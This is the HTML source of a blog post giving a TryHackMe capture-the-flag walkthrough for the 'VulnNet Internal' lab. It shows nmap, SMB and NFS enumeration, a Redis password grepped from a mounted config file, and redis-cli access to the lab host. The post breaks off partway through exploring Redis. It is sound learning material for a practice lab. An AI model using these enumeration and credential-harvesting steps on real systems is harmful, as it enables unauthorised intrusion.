@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Lots of tools to learn: NFS, Redis &amp; rsync. Top it off with a sweet PrivEsc exploit.'><title>TryHackMe: VulnNet Internal Writeup</title>
+
+<link rel='canonical' href='/p/tryhackme-vulnnet-internal-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: VulnNet Internal Writeup'>
+<meta property='og:description' content='Lots of tools to learn: NFS, Redis &amp; rsync. Top it off with a sweet PrivEsc exploit.'>
+<meta property='og:url' content='/p/tryhackme-vulnnet-internal-writeup/'>
+<meta property='og:site_name' content='Tanishq Chaudhary'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='smb' /><meta property='article:tag' content='rsync' /><meta property='article:tag' content='nfs' /><meta property='article:tag' content='redis' /><meta property='article:published_time' content='2021-06-17T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-17T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/3ec8CfD.png' />
+<meta name="twitter:title" content="TryHackMe: VulnNet Internal Writeup">
+<meta name="twitter:description" content="Lots of tools to learn: NFS, Redis &amp; rsync. Top it off with a sweet PrivEsc exploit."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/3ec8CfD.png' />
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-197211752-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu8feb5f378a01bc01544f018dbe1cdca8_26024_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">Tanishq Chaudhary</a></h1>
+        <h2 class="site-description">Undergrad Researcher at LTRC, IIIT-H. I&#39;m doing CTFs for fun.</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/thm'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="552.000000pt" height="564.000000pt" viewBox="0 0 552.000000 564.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,564.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2280 5630 c-345 -48 -646 -195 -885 -435 -126 -126 -204 -230 -280
+-377 -52 -99 -134 -321 -135 -363 -1 -35 -14 -44 -91 -59 -231 -44 -420 -147
+-583 -316 -131 -136 -210 -272 -260 -444 -110 -380 4 -796 293 -1069 131 -123
+296 -215 478 -265 l98 -27 905 -3 c849 -2 907 -1 940 15 104 53 108 192 7 267
+-28 21 -35 21 -935 26 l-907 5 -88 31 c-205 74 -358 209 -451 399 -46 93 -66
+170 -73 285 -22 360 213 680 574 782 110 31 286 31 396 0 81 -23 162 -60 243
+-112 80 -50 172 -34 221 39 29 43 31 113 3 158 -49 81 -222 167 -457 229 -9 2
+-8 16 3 56 121 413 449 731 871 845 91 25 113 27 298 27 185 0 207 -2 298 -27
+450 -121 794 -479 892 -927 13 -58 13 -66 -2 -75 -8 -5 -44 -28 -79 -50 -35
+-23 -72 -51 -80 -64 -39 -55 -34 -142 9 -189 62 -67 140 -68 240 -3 215 140
+505 156 742 42 210 -102 354 -275 418 -504 28 -98 57 -139 114 -158 71 -23
+153 15 184 87 24 54 21 85 -23 219 -95 292 -323 537 -609 656 -144 59 -208 70
+-416 76 l-192 5 -12 52 c-6 28 -27 96 -46 150 -177 510 -603 883 -1138 996
+-114 24 -378 35 -485 20z"/>
+<path d="M3605 3136 c-45 -19 -92 -79 -110 -138 -20 -68 -20 -257 0 -325 32
+-107 101 -163 200 -163 140 1 204 87 213 285 8 180 -34 296 -121 336 -49 22
+-138 24 -182 5z m109 -96 c49 -18 61 -61 61 -210 0 -118 -3 -139 -21 -170 -17
+-30 -25 -35 -58 -35 -31 0 -43 6 -60 28 -19 26 -21 42 -21 170 0 172 10 204
+72 226 1 1 13 -3 27 -9z"/>
+<path d="M5120 3128 c-35 -18 -51 -35 -72 -78 -66 -133 -56 -381 19 -471 55
+-66 166 -88 249 -50 75 34 112 113 121 258 10 158 -28 281 -104 333 -53 36
+-151 40 -213 8z m147 -100 c26 -21 38 -85 38 -203 -1 -138 -16 -190 -59 -201
+-36 -9 -69 1 -84 26 -33 54 -33 306 -1 359 24 38 72 46 106 19z"/>
+<path d="M3104 3069 c-49 -39 -93 -74 -98 -79 -9 -9 40 -80 56 -80 6 0 32 18
+58 40 26 22 49 40 51 40 2 0 2 -106 0 -235 l-3 -235 71 0 71 0 0 310 0 310
+-59 0 c-58 0 -60 -1 -147 -71z"/>
+<path d="M4639 3074 c-123 -96 -117 -87 -85 -128 15 -20 31 -36 36 -36 4 0 32
+20 62 44 l53 43 -3 -238 -3 -239 66 0 65 0 0 310 0 310 -53 0 c-51 0 -58 -3
+-138 -66z"/>
+<path d="M4625 2196 c-90 -25 -135 -101 -150 -256 -9 -83 9 -206 37 -266 41
+-88 134 -129 239 -104 64 16 111 60 135 132 26 72 26 291 1 357 -46 119 -142
+169 -262 137z m97 -107 c28 -15 47 -66 54 -147 14 -153 -18 -263 -80 -270 -62
+-7 -88 53 -88 206 0 122 13 185 45 207 25 18 41 19 69 4z"/>
+<path d="M3101 2120 c-55 -44 -101 -83 -101 -86 0 -8 54 -74 62 -74 3 0 30 20
+60 44 l53 43 -4 -238 -3 -239 71 0 71 0 -2 313 -3 312 -51 3 c-51 3 -53 2
+-153 -78z"/>
+<path d="M3601 2120 c-56 -44 -101 -83 -101 -88 0 -4 13 -23 29 -42 l29 -34
+59 45 58 46 -3 -238 -3 -239 65 0 66 0 0 315 0 315 -49 0 c-47 0 -55 -4 -150
+-80z"/>
+<path d="M4125 2142 c-39 -31 -84 -68 -102 -82 l-32 -25 34 -40 33 -39 59 46
+58 45 -3 -238 -3 -239 66 0 65 0 0 315 0 315 -52 -1 c-49 0 -58 -5 -123 -57z"/>
+<path d="M4974 1356 c-71 -32 -98 -104 -92 -246 3 -73 8 -104 24 -130 58 -101
+196 -108 255 -14 21 34 24 53 27 154 3 104 1 119 -20 159 -13 25 -35 53 -49
+64 -34 25 -105 31 -145 13z m103 -93 c14 -21 18 -48 18 -128 0 -80 -4 -107
+-18 -128 -22 -34 -61 -36 -81 -4 -36 54 -27 254 12 277 29 16 51 11 69 -17z"/>
+<path d="M3073 1353 c-40 -8 -81 -59 -94 -117 -17 -77 -8 -214 17 -257 32 -55
+80 -82 137 -76 102 9 141 71 141 222 0 113 -21 180 -68 210 -27 18 -94 27
+-133 18z m92 -103 c10 -20 15 -58 15 -119 0 -129 -17 -162 -75 -147 -33 8 -48
+68 -43 173 3 62 9 88 23 103 27 30 62 26 80 -10z"/>
+<path d="M3769 1345 c-23 -10 -44 -31 -60 -58 -22 -38 -24 -54 -24 -157 0
+-130 13 -166 76 -208 27 -19 43 -23 82 -19 102 9 141 71 142 222 0 155 -40
+223 -138 231 -24 2 -57 -3 -78 -11z m108 -95 c8 -15 13 -64 13 -120 0 -56 -5
+-105 -13 -120 -17 -33 -57 -38 -83 -9 -16 18 -19 36 -19 129 0 93 3 111 19
+129 26 29 66 24 83 -9z"/>
+<path d="M5328 1304 c-38 -30 -68 -58 -68 -62 1 -4 9 -17 20 -30 21 -26 39
+-21 74 17 11 12 22 21 25 21 4 0 5 -76 3 -170 l-4 -170 51 0 51 0 0 225 0 225
+-42 0 c-37 0 -52 -8 -110 -56z"/>
+<path d="M3407 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 53 13 l39 31 0
+-166 0 -166 50 0 50 0 0 220 0 220 -42 0 c-37 0 -52 -8 -111 -56z"/>
+<path d="M4117 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 52 12 21 17 39
+30 41 30 2 0 3 -74 1 -165 l-3 -165 50 0 51 0 0 220 0 220 -42 0 c-37 0 -52
+-8 -111 -56z"/>
+<path d="M4561 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 155 -208 100 0
+148 75 147 231 -1 92 -23 158 -65 194 -25 20 -41 25 -89 25 -48 0 -64 -5 -89
+-25z m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27
+-72 0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9
+36 -21z"/>
+<path d="M4942 795 c-40 -31 -72 -59 -72 -63 0 -4 9 -18 19 -32 l20 -25 40 33
+41 33 0 -171 0 -171 48 3 47 3 0 220 0 220 -36 3 c-30 3 -46 -5 -107 -53z"/>
+<path d="M5271 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 157 -208 48 0
+57 3 91 38 32 32 39 47 50 110 20 119 -5 229 -62 277 -43 36 -133 36 -177 0z
+m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
+0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9 36
+-21z"/>
+<path d="M3019 715 c-69 -37 -81 -224 -19 -287 52 -51 146 -32 169 34 19 54
+14 178 -9 216 -31 50 -89 65 -141 37z m79 -58 c18 -21 25 -109 13 -154 -14
+-50 -39 -63 -63 -33 -20 25 -25 130 -8 174 10 28 40 35 58 13z"/>
+<path d="M3280 684 c-53 -42 -54 -43 -35 -68 15 -19 15 -19 38 2 13 12 26 22
+30 22 4 0 7 -54 7 -121 l0 -120 33 3 32 3 3 158 3 157 -33 0 c-23 0 -47 -11
+-78 -36z"/>
+<path d="M3913 320 c-35 -14 -55 -55 -61 -125 -5 -73 11 -145 38 -170 10 -9
+37 -19 59 -22 80 -11 121 45 121 164 0 127 -65 190 -157 153z m77 -65 c14 -17
+18 -136 6 -172 -9 -29 -35 -37 -57 -17 -15 14 -19 32 -19 91 0 41 5 83 10 94
+13 23 43 25 60 4z"/>
+<path d="M4167 284 c-52 -40 -52 -41 -33 -67 13 -17 15 -16 45 9 l31 26 0
+-126 0 -126 30 0 30 0 0 160 0 160 -28 0 c-18 0 -47 -14 -75 -36z"/>
+</g>
+</svg>
+
+                
+                <span>TryHackMe Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/'>
+                
+                    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="500.536px" height="500.536px" viewBox="0 0 500.536 500.536" style="enable-background:new 0 0 500.536 500.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M410.614,323.309L186.108,98.815c-2.444-2.444-5.754-3.818-9.212-3.818H94.702c-5.925-7.524-13.878-13.97-23.241-18.613
+		c-22.529-11.198-47.907-9.351-61.738,4.465c-2.554,2.556-4.661,5.473-6.239,8.674c-5.11,10.272-4.581,22.481,1.472,34.362
+		c5.834,11.464,16.178,21.311,29.143,27.745c5.816,2.887,11.818,4.888,17.765,6.064v62.329c0.006,3.458,1.38,6.78,3.824,9.218
+		l224.494,224.499c5.095,5.096,13.34,5.096,18.436,0L410.62,341.738C415.703,336.655,415.703,328.403,410.614,323.309z
+		 M55.688,98.815c-2.438,2.438-3.818,5.763-3.818,9.212v40.802c-4.648-1.067-9.327-2.713-13.905-4.983
+		c-11.298-5.609-20.28-14.097-25.263-23.909c-4.776-9.369-5.284-18.799-1.434-26.545c1.162-2.355,2.705-4.51,4.604-6.393
+		c11.222-11.222,32.492-12.383,51.725-2.831c5.861,2.905,11.065,6.591,15.448,10.829H64.905
+		C61.445,94.988,58.132,96.365,55.688,98.815z M84.364,127.497c3.487-3.49,7.826-5.627,12.354-6.428
+		c0.399,4.82-0.375,9.425-2.415,13.547c-1.162,2.355-2.71,4.51-4.61,6.398c-3.18,3.183-7.19,5.523-11.724,7.075
+		C76.635,140.85,78.76,133.098,84.364,127.497z M117.139,160.272c-9.049,9.049-23.726,9.049-32.775,0
+		c-1.271-1.271-2.353-2.657-3.257-4.125c5.654-1.969,10.702-4.947,14.738-8.984c2.557-2.554,4.661-5.471,6.242-8.671
+		c2.657-5.353,3.76-11.225,3.378-17.295c4.28,0.883,8.364,2.979,11.68,6.301C126.188,136.546,126.188,151.217,117.139,160.272z
+		 M496.717,315.631L384.725,427.628c-5.095,5.089-13.352,5.089-18.441,0l-5.674-5.675l69.83-69.841
+		c4.899-4.889,7.589-11.391,7.589-18.3c0-6.91-2.684-13.412-7.583-18.294L205.957,91.013c-4.903-4.891-11.399-7.578-18.291-7.578
+		h-49.694v-1.519c0-3.455,1.38-6.773,3.827-9.218c2.444-2.441,5.748-3.818,9.206-3.818h18.146
+		c-4.389-4.232-9.599-7.923-15.447-10.829c-19.24-9.552-40.51-8.39-51.731,2.832c-1.894,1.882-3.431,4.037-4.613,6.393
+		c-0.556,1.138-0.999,2.311-1.374,3.517c-2.474-1.581-5.003-3.083-7.654-4.412c0.381-0.999,0.762-2.004,1.241-2.974
+		c1.596-3.194,3.691-6.111,6.25-8.674c13.819-13.816,39.215-15.658,61.738-4.466c9.357,4.643,17.315,11.089,23.235,18.613h82.198
+		c3.446,0,6.768,1.377,9.215,3.818l224.496,224.497C501.812,302.29,501.812,310.548,496.717,315.631z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryhackme-vulnnet-internal-writeup/">
+                
+                    <img src="https://i.imgur.com/3ec8CfD.png" loading="lazy" alt="Featured image of post TryHackMe: VulnNet Internal Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/tryhackme-vulnnet-internal-writeup/">TryHackMe: VulnNet Internal Writeup</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Lots of tools to learn: NFS, Redis &amp; rsync. Top it off with a sweet PrivEsc exploit.
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 17, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><a class="link" href="https://tryhackme.com/room/vulnnetinternal"  target="_blank" rel="noopener"
+    >Play</a></p>
+<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>Not shown: 993 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
+|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
+|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      35488/udp6  mountd
+|   100005  1,2,3      54985/tcp   mountd
+|   100005  1,2,3      56181/tcp6  mountd
+|   100005  1,2,3      56789/udp   mountd
+|   100021  1,3,4      32910/udp   nlockmgr
+|   100021  1,3,4      42203/tcp6  nlockmgr
+|   100021  1,3,4      42497/tcp   nlockmgr
+|   100021  1,3,4      49999/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+873/tcp  open     rsync       (protocol version 31)
+2049/tcp open     nfs_acl     3 (RPC #100227)
+9090/tcp filtered zeus-admin
+Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s
+| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   VULNNET-INTERNA&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   VULNNET-INTERNA&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   VULNNET-INTERNA&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: vulnnet-internal
+|   NetBIOS computer name: VULNNET-INTERNAL\x00
+|   Domain name: \x00
+|   FQDN: vulnnet-internal
+|_  System time: 2021-06-16T05:50:05+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-16T03:50:05
+|_  start_date: N/A
+</code></pre><p>Info gathered:</p>
+<ul>
+<li>ssh open</li>
+<li>rpcbind looks interesting</li>
+<li>rsync working</li>
+<li>SMB open</li>
+</ul>
+<p>Let&rsquo;s start with SMB.</p>
+<h3 id="12-smb-enumeration">1.2. SMB Enumeration</h3>
+<p>Listing all the shares.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ smbclient -L 10.10.95.197 -N    
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+</code></pre><p>Using <code>smbclient //10.10.95.197/shares -N</code> we can get in, and see all of the files in the directories. We see <code>temp</code> and <code>data</code> directories in <code>shares</code>. One by one, I got all of the files, using the command:<code>get file_name.extension</code>.</p>
+<p>Here&rsquo;s all of what I got:</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ cat business-req.txt 
+We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
+If you have any questions, please text or phone us.
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cat data.txt 
+Purge regularly data that is not needed anymore
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cat services.txt 
+THM{flag_was_here_yee}
+</code></pre><p>None of them are interesting, and this looks like a dead end. Let&rsquo;s check out port 111, rpcbind.</p>
+<h3 id="13-rpc-bind">1.3. RPC-Bind</h3>
+<p>Googling, we get <a class="link" href="https://sites.cns.utexas.edu/oit-blog/blog/port-111-rpcbind-vulnerability"  target="_blank" rel="noopener"
+    >this</a>. A DDoS attack. This is not useful for us.</p>
+<p>Okay, how about the NFS thingy listed in the nmap scan results, inside of RPC bind?</p>
+<h3 id="14-nfs">1.4. NFS</h3>
+<p>Let&rsquo;s list them out. The <code>-e</code> or <code>--exports</code> flag gives us the export list of a server.</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
+└─$ showmount --exports 10.10.95.197
+Export list for 10.10.95.197:
+/opt/conf *
+</code></pre><p>Configuration files are usually very interesting. Let&rsquo;s get these files on our system.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ mount -t nfs 10.10.95.197:/opt/conf conf
+mount.nfs: failed to apply fstab options
+</code></pre><p>What is happening here?</p>
+<ul>
+<li><code>-t</code> or <code>--type</code> helps us specify the type of mount we want to do, which is <code>nfs</code>. Common filesystem types are <code>ext2</code>, <code>xfs</code>, <code>brtfs</code>.</li>
+<li>rest of the syntax is ssh-like</li>
+<li><code>conf</code> at the end is the name of the emptuy directory on my system</li>
+</ul>
+<p>Don&rsquo;t forget the sudo option if <code>mount -t nfs</code> gives you errors.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ sudo mount -t nfs 10.10.95.197:/opt/conf conf
+[sudo] password for kali: 
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cd conf                  
+                                                                        
+┌──(kali㉿kali)-[/tmp/conf]
+└─$ ls
+hp  init  opt  profile.d  redis  vim  wildmidi
+                                                                        
+┌──(kali㉿kali)-[/tmp/conf]
+└─$ tree .     
+.
+├── hp
+│   └── hplip.conf
+├── init
+│   ├── anacron.conf
+│   ├── lightdm.conf
+│   └── whoopsie.conf
+├── opt
+├── profile.d
+│   ├── bash_completion.sh
+│   ├── cedilla-portuguese.sh
+│   ├── input-method-config.sh
+│   └── vte-2.91.sh
+├── redis
+│   └── redis.conf
+├── vim
+│   ├── vimrc
+│   └── vimrc.tiny
+└── wildmidi
+    └── wildmidi.cfg
+</code></pre><p>Quick googling tells me <code>redis</code> is related to database. Things just got intersting!</p>
+<h3 id="15-getting-in-redis">1.5. Getting in Redis</h3>
+<p>Let&rsquo;s search for passwords, using <code>pass</code> or <code>password</code> like terms.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp/conf]
+└─$ grep -r &quot;pass&quot; .
+./redis/redis.conf:# 2) No password is configured.
+./redis/redis.conf:# If the master is password protected (using the &quot;requirepass&quot; configuration
+./redis/redis.conf:# masterauth &lt;master-password&gt;
+./redis/redis.conf:requirepass &quot;B65Hx562F@ggAZ@F&quot;
+./redis/redis.conf:# resync is enough, just passing the portion of data the slave missed while
+./redis/redis.conf:# 150k passwords per second against a good box. This means that you should
+./redis/redis.conf:# use a very strong password otherwise it will be very easy to break.
+./redis/redis.conf:# requirepass foobared
+</code></pre><p>Since we have the password, one option is to use <strong>telnet</strong>. It works using the same TCP/IP protocol we are familiar with. <code>telnet MACHINE_IP PORT_NUMBER</code> gets you in. Use the command <code>AUTH mmm</code>, where mmm is the password to authorize yourself.</p>
+<p>Alternatively, download <code>redis-cli</code>, which looks better and has autocomplete suggestions.</p>
+<p><a class="link" href="https://lzone.de/cheat-sheet/Redis"  target="_blank" rel="noopener"
+    >Redis Cheat Sheet here</a></p>
+<pre><code>┌──(kali㉿kali)-[/]
+└─$ redis-cli -h 10.10.95.197 -a &quot;B65Hx562F@ggAZ@F&quot;
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+10.10.95.197:6379&gt; keys *
+1) &quot;tmp&quot;
+2) &quot;authlist&quot;
+3) &quot;int&quot;
+4) &quot;internal flag&quot;
+5) &quot;marketlist&quot;
+10.10.95.197:6379&gt; type &quot;internal flag&quot;
+string
+10.10.95.197:6379&gt; get &quot;internal flag&quot;
+&quot;THM{ff8e518addbbddb74531a724236a8221}&quot;
+10.10.95.197:6379&gt; type &quot;marketlist&quot;
+list
+10.10.95.197:6379&gt; type &quot;authlist&quot;
+list
+</code></pre><p>The commands are self explanatory.</p>
+<h3 id="exploring-redis">Exploring Redis</h3>
+<p>What about <code>marketlist</code>?</p>
+<pre><code>10.10.95.197:6379&gt; lrange marketlist 0 9000
+1) &quot;Machine Learning&quot;
+2) &quot;Penetration Testing&quot;
+3) &quot;Programming&quot;
+4) &quot;Data Analysis&quot;
+5) &quot;Analytics&quot;
+6) &quot;Marketing&quot;
+7) &quot;Media Streaming&quot;
+10.10.95.197:6379&gt; type &quot;Machine Learning&quot;
+none
